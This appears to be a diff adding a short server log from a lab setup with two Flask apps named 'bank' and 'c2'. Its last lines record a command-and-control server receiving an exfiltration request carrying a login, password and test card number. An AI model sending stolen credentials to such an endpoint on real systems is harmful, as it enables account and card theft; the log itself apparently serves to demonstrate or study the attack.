@@ -1,0 +1,11 @@
+ * Serving Flask app 'bank'
+ * Serving Flask app 'c2'
+ * Debug mode: off
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8888
+ * Running on http://192.168.3.244:8888
+Press CTRL+C to quit
+[C2:9999] EXFILTRATION: /exfiltrate  args={'login': 'jack', 'pass': 'Jack@123', 'card': '4111111111111111'}
+127.0.0.1 - - [13/Jun/2026 16:12:31] "GET /exfiltrate?login=jack&pass=Jack@123&card=4111111111111111 HTTP/1.0" 200 -
